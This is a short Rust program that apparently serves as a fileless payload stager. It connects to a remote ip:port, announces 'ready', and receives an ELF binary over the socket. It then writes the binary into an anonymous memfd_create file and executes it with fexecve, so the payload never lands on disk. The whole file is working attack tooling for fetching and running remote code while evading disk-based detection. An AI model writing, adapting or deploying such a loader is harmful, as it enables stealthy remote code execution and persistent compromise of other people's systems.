use std::{env, io::{Read, Write}, net::TcpStream, process::exit};


#[cfg(target_os = "linux")]
mod linux_memfd {
    use std::os::unix::io::FromRawFd;
    use std::ffi::{CString};
    use std::io::Write;

    #[cfg(target_arch = "x86_64")]
    const SYS_MEMFD_CREATE: libc::c_long = 319;

    #[cfg(target_arch = "aarch64")]
    const SYS_MEMFD_CREATE: libc::c_long = 279;

    pub fn run_memfd_create(elf_bytes: &[u8]) {
        // Create memfd
        let fd = unsafe {
            libc::syscall(
                SYS_MEMFD_CREATE,
                CString::new("memexec").unwrap().as_ptr(),
                libc::MFD_CLOEXEC,
            ) as i32
        };
        if fd < 0 {
            panic!("memfd_create failed");
        }

        let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
        file.write_all(elf_bytes).expect("write failed");

        let argv = [CString::new("memexec").unwrap()];
        let argv_ptrs: Vec<_> = argv.iter().map(|s| s.as_ptr()).chain(Some(std::ptr::null())).collect();

        let envp_ptrs: [*const i8; 1] = [std::ptr::null()];

        let ret = unsafe { libc::fexecve(fd, argv_ptrs.as_ptr(), envp_ptrs.as_ptr()) };
        panic!("fexecve failed: {}", std::io::Error::last_os_error());
    }
}


#[cfg(not(target_os = "linux"))]
mod linux_memfd {
    pub fn run_memfd_create(_elf_bytes: &[u8]) {
        eprintln!("memfd_create + fexecve is Linux-only and not supported on this OS");
        std::process::exit(1);
    }
}


fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() <= 1 {
        eprintln!("Usage \n\t {} ip:port", args[0]);
        exit(1);
    }
    let mut stream = TcpStream::connect(&args[1])
        .expect("failed to connect to remote server");

    stream.write("ready\n".as_bytes()).unwrap(); 
    stream.flush().unwrap();

    // Read exectuable file
    let mut buffer = Vec::new();
    let n = stream.read_to_end(&mut buffer).unwrap();

    let elf_bytes = &buffer[0..n];
    linux_memfd::run_memfd_create(elf_bytes);

}
